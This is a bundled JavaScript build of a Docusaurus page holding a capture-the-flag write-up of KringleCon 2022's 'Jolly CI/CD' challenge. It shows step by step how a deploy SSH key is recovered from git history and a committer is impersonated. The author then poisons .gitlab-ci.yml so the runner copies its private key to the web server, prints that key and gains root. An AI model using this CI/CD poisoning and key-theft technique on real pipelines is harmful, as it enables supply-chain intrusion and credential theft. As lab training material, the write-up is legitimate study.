"use strict";(self.webpackChunkkringlecon_2022=self.webpackChunkkringlecon_2022||[]).push([[2038],{3905:(e,n,t)=>{t.d(n,{Zo:()=>d,kt:()=>h});var r=t(7294);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function l(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function o(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?l(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):l(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function s(e,n){if(null==e)return{};var t,r,a=function(e,n){if(null==e)return{};var t,r,a={},l=Object.keys(e);for(r=0;r<l.length;r++)t=l[r],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);for(r=0;r<l.length;r++)t=l[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var i=r.createContext({}),c=function(e){var n=r.useContext(i),t=n;return e&&(t="function"==typeof e?e(n):o(o({},n),e)),t},d=function(e){var n=c(e.components);return r.createElement(i.Provider,{value:n},e.children)},g={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},p=r.forwardRef((function(e,n){var t=e.components,a=e.mdxType,l=e.originalType,i=e.parentName,d=s(e,["components","mdxType","originalType","parentName"]),p=c(t),h=a,u=p["".concat(i,".").concat(h)]||p[h]||g[h]||l;return t?r.createElement(u,o(o({ref:n},d),{},{components:t})):r.createElement(u,o({ref:n},d))}));function h(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var l=t.length,o=new Array(l);o[0]=p;var s={};for(var i in n)hasOwnProperty.call(n,i)&&(s[i]=n[i]);s.originalType=e,s.mdxType="string"==typeof e?e:a,o[1]=s;for(var c=2;c<l;c++)o[c]=t[c];return r.createElement.apply(null,o)}return r.createElement.apply(null,t)}p.displayName="MDXCreateElement"},1239:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>i,contentTitle:()=>o,default:()=>g,frontMatter:()=>l,metadata:()=>s,toc:()=>c});var r=t(7462),a=(t(7294),t(3905));const l={sidebar_position:3},o="Jolly CI/CD",s={unversionedId:"objectives/ElfenRing/jolly_ci_cd",id:"objectives/ElfenRing/jolly_ci_cd",title:"Jolly CI/CD",description:"Welcome screen",source:"@site/docs/objectives/ElfenRing/jolly_ci_cd.md",sourceDirName:"objectives/ElfenRing",slug:"/objectives/ElfenRing/jolly_ci_cd",permalink:"/kringlecon-2022/docs/objectives/ElfenRing/jolly_ci_cd",draft:!1,tags:[],version:"current",sidebarPosition:3,frontMatter:{sidebar_position:3},sidebar:"tutorialSidebar",previous:{title:"Prison Escape",permalink:"/kringlecon-2022/docs/objectives/ElfenRing/prison_escape"},next:{title:"Recover Web Ring",permalink:"/kringlecon-2022/docs/category/recover-web-ring"}},i={},c=[{value:"Welcome screen",id:"welcome-screen",level:2},{value:"Helpfull hints",id:"helpfull-hints",level:2},{value:"Hacking CI/CD",id:"hacking-cicd",level:2}],d={toc:c};function g(e){let{components:n,...l}=e;return(0,a.kt)("wrapper",(0,r.Z)({},d,l,{components:n,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"jolly-cicd"},"Jolly CI/CD"),(0,a.kt)("h2",{id:"welcome-screen"},"Welcome screen"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},"Greetings Noble Player, \n\nMany thanks for answering our desperate cry for help!\n\nYou may have heard that some evil Sporcs have opened up a web-store selling \ncounterfeit banners and flags of the many noble houses found in the land of \nthe North! They have leveraged some dastardly technology to power their \nstorefront, and this technology is known as PHP! \n\n***gasp*** \n\nThis strorefront utilizes a truly despicable amount of resources to keep the \nwebsite up. And there is only a certain type of Christmas Magic capable of \npowering such a thing\u2026 an Elfen Ring!\n\nAlong with PHP there is something new we've not yet seen in our land. \nA technology called Continuous Integration and Continuous Deployment! \n\nBe wary! \n\nMany fair elves have suffered greatly but in doing so, they've managed to \nsecure you a persistent connection on an internal network. \n\nBTW take excellent notes! \n\nShould you lose your connection or be discovered and evicted the \nelves can work to re-establish persistence. In fact, the sound off fans\nand the sag in lighting tells me all the systems are booting up again right now.  \n\nPlease, for the sake of our Holiday help us recover the Ring and save Christmas!\n")),(0,a.kt)("h2",{id:"helpfull-hints"},"Helpfull hints"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"Commiting to Mistakes\nFrom: Tinsel Upatree\nTerminal: Jolly CI/CD\nThe thing about Git is that every step of development is accessible \u2013 even steps you didn't mean to take! git log can show code skeletons.\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"Switching Hats\nFrom: Tinsel Upatree\nTerminal: Jolly CI/CD\nIf you find a way to impersonate another identity, you might try re-cloning a repo with their credentials.\n")),(0,a.kt)("p",null,(0,a.kt)("img",{alt:"Git hint",src:t(3164).Z,width:"369",height:"566"})),(0,a.kt)("h2",{id:"hacking-cicd"},"Hacking CI/CD"),(0,a.kt)("p",null,"From talking to Tinsel Upatree we get a link to a Gitlab repo (see screenshot above). Cloning it: "),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},"grinchum-land:~$ git clone http://gitlab.flag.net.internal/rings-of-powder\nCloning into 'rings-of-powder'...\nfatal: unable to update url base from redirection:\n  asked for: http://gitlab.flag.net.internal/rings-of-powder/info/refs?service=git-upload-pack\n   redirect: http://gitlab.flag.net.internal/users/sign_in\ngrinchum-land:~$\n")),(0,a.kt)("p",null,"No access here. Trying the full link hinted by Upatree"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},"grinchum-land:~$ git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git\nCloning into 'wordpress.flag.net.internal'...\nremote: Enumerating objects: 10195, done.\nremote: Total 10195 (delta 0), reused 0 (delta 0), pack-reused 10195\nReceiving objects: 100% (10195/10195), 36.49 MiB | 23.07 MiB/s, done.\nResolving deltas: 100% (1799/1799), done.\nUpdating files: 100% (9320/9320), done.\ngrinchum-land:~$\n")),(0,a.kt)("p",null,"Looking at what I've cloned"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},"grinchum-land:~/wordpress.flag.net.internal$ git status\nfatal: detected dubious ownership in repository at '/home/samways/wordpress.flag.net.internal'\nTo add an exception for this directory, call:\n\n        git config --global --add safe.directory /home/samways/wordpress.flag.net.internal\ngrinchum-land:~/wordpress.flag.net.internal$ git config --global --add safe.directory /home/samways/wordpress.flag.net.internal\ngrinchum-land:~/wordpress.flag.net.internal$ git status\nOn branch main\nYour branch is up to date with 'origin/main'.\n\nnothing to commit, working tree clean\ngrinchum-land:~/wordpress.flag.net.internal$\n")),(0,a.kt)("p",null,"Looking at the Git commit log, there are ususally gold to be found in the log:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},"grinchum-land:~/wordpress.flag.net.internal$ git log\n.\n.\n.\n\ncommit e19f653bde9ea3de6af21a587e41e7a909db1ca5\nAuthor: knee-oh <sporx@kringlecon.com>\nDate:   Tue Oct 25 13:42:54 2022 -0700\n\n    whoops\n\ncommit abdea0ebb21b156c01f7533cea3b895c26198c98\nAuthor: knee-oh <sporx@kringlecon.com>\nDate:   Tue Oct 25 13:42:13 2022 -0700\n\n    added assets\n")),(0,a.kt)("p",null,'It appears user "knee-oh" made a happy little accident in commit abdea0ebb21b156c01f7533cea3b895c26198c98 and rectified it in commit e19f653bde9ea3de6af21a587e41e7a909db1ca5. Let\'s see what accident that was!'),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},"grinchum-land:~/wordpress.flag.net.internal$ git checkout abdea0ebb21b156c01f7533cea3b895c26198c98\nHEAD is now at abdea0e added assets\ngrinchum-land:~/wordpress.flag.net.internal$ ls -la\ntotal 48\ndrwxr-xr-x 5 samways users  4096 Dec 11 08:35 .\ndrwxr-xr-x 1 samways  1002  4096 Dec 11 08:26 ..\ndrwxr-xr-x 8 samways users  4096 Dec 11 08:36 .git\ndrwxr-xr-x 2 samways users  4096 Dec 11 08:35 .ssh\n-rw-r--r-- 1 samways users 19915 Dec 11 08:24 license.txt\n-rw-r--r-- 1 samways users  7401 Dec 11 08:24 readme.html\ndrwxr-xr-x 6 samways users  4096 Dec 11 08:24 wp-content\n")),(0,a.kt)("p",null,"Oh - look at that! A .ssh folder, what's inside?"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},"grinchum-land:~/wordpress.flag.net.internal$ ls -la .ssh/\ntotal 16\ndrwxr-xr-x 2 samways users 4096 Dec 11 08:35 .\ndrwxr-xr-x 5 samways users 4096 Dec 11 08:35 ..\n-rw-r--r-- 1 samways users  411 Dec 11 08:35 .deploy\n-rw-r--r-- 1 samways users  102 Dec 11 08:35 .deploy.pub\n")),(0,a.kt)("p",null,"Let's make use of this SSH key"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},"grinchum-land:~/wordpress.flag.net.internal$ cp -r .ssh $HOME/\ngrinchum-land:~/wordpress.flag.net.internal$ chmod 700 $HOME/    \ngrinchum-land:~/wordpress.flag.net.internal$ chmod 700 $HOME/.ssh/\ngrinchum-land:~/wordpress.flag.net.internal$ chmod 644 $HOME/.ssh/.deploy.pub \ngrinchum-land:~/wordpress.flag.net.internal$ chmod 600 $HOME/.ssh/.deploy\ngrinchum-land:~/wordpress.flag.net.internal$ touch $HOME/.ssh/config\n")),(0,a.kt)("p",null,"I had to tell Git which private key to use by creating a config file and putting this as its content:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"Host gitlab.flag.net.internal\n  User git\n  Hostname gitlab.flag.net.internal\n  IdentityFile ~/.ssh/.deploy\n")),(0,a.kt)("p",null,"Cloning the repository using SSH instead of HTTP:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},"grinchum-land:~$ git clone git@gitlab.flag.net.internal:/rings-of-powder/wordpress.flag.net.internal.git\n")),(0,a.kt)("p",null,"Further impersonation, update the Git username and email settings (values grabbed from git log):"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},'grinchum-land:~/wordpress.flag.net.internal$ git config --global user.name "knee-oh"\ngrinchum-land:~/wordpress.flag.net.internal$ git config --global user.email "sporx@kringlecon.com"\n')),(0,a.kt)("p",null,"At this point it was tiresome to reproduce the steps above each time the terminal was reset, so I put my commands in a script to make things more efficient:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},'git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git\ncd wordpress.flag.net.internal\ngit checkout abdea0ebb21b156c01f7533cea3b895c26198c98\ncp -r .ssh $HOME/\nchmod 700 $HOME/    \nchmod 700 $HOME/.ssh/\nchmod 644 $HOME/.ssh/.deploy.pub \nchmod 600 $HOME/.ssh/.deploy\ntouch $HOME/.ssh/config\necho -e "Host gitlab.flag.net.internal\\n\\tUser git\\n\\tHostname gitlab.flag.net.internal\\n\\tIdentityFile ~/.ssh/.deploy" >> $HOME/.ssh/config\ncd \nmv wordpress.flag.net.internal wordpress.flag.net.internal.bak \ngit clone git@gitlab.flag.net.internal:/rings-of-powder/wordpress.flag.net.internal.git\ngit config --global user.name "knee-oh"\ngit config --global user.email "sporx@kringlecon.com"\n')),(0,a.kt)("p",null,"Now, here's the meat. Inside the repositoriy there is a file .gitlab-ci.yml "),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},'grinchum-land:~/wordpress.flag.net.internal$ cat .gitlab-ci.yml \nstages:\n  - deploy\n\ndeploy-job:      \n  stage: deploy \n  environment: production\n  script:\n    - rsync -e "ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy" --chown=www-data:www-data -atv --delete --progress ./ root@wordpress.flag.net.internal:/var/www/htm\n')),(0,a.kt)("p",null,"This contains a command to run when deploying. If we look closer at it, it uses a SSH key (/etc/gitlab-runner/hhc22-wordpress-deploy). If we change the file to:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},'stages:\n  - deploy\n\ndeploy-job:      \n  stage: deploy \n  environment: production\n  script:\n    - rsync -e "ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy" --chown=www-data:www-data -atv --delete --progress /etc/gitlab-runner/hhc22-wordpress-deploy root@wordpress.flag.net.internal:/var/www/htm\n')),(0,a.kt)("p",null,"The SSH key will be rsynced over to the webserver when the deployment runs. So lets commit the file above and retrieve the SSH key:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},"grinchum-land:~/wordpress.flag.net.internal$ wget wordpress.flag.net.internal/hhc22-wordpress-deploy\ngrinchum-land:~/wordpress.flag.net.internal$ cat hhc22-wordpress-deploy \n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACD8EYdZTOpf5REuWXMb9FKCFWoiIX2HoU1aH90V0Ptq3wAAAJiMXr0BjF69\nAQAAAAtzc2gtZWQyNTUxOQAAACD8EYdZTOpf5REuWXMb9FKCFWoiIX2HoU1aH90V0Ptq3w\nAAAEBtNE6sqOFoqkmOhcB/9DgzaQhQRC/bwkAbsBXwqrt/mPwRh1lM6l/lES5Zcxv0UoIV\naiIhfYehTVof3RXQ+2rfAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==\n-----END OPENSSH PRIVATE KEY-----\ngrinchum-land:~/wordpress.flag.net.internal$\n")),(0,a.kt)("p",null,"Success! Now ssh into the Wordpress server:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},"grinchum-land:~/wordpress.flag.net.internal$ chmod 600 hhc22-wordpress-deploy \ngrinchum-land:~/wordpress.flag.net.internal$ ssh root@wordpress.flag.net.internal -i hhc22-wordpress-deploy\nroot@wordpress:~# ls /\nbin  boot  dev  etc  flag.txt  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var\nroot@wordpress:~# cd /  \nroot@wordpress:/# cat flag.txt\n")),(0,a.kt)("p",null,"And the flag is: "),(0,a.kt)("p",null,(0,a.kt)("img",{alt:"Elfen ring flag",src:t(5966).Z,width:"849",height:"724"})),(0,a.kt)("p",null,"Text value: oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT"))}g.isMDXComponent=!0},5966:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/images/elfen-ring-flag-f0c8eabec64fed5cd84d73b52a7eb2db.png"},3164:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/images/git-hint-68026844d866b272d277e7359143c58b.png"}}]);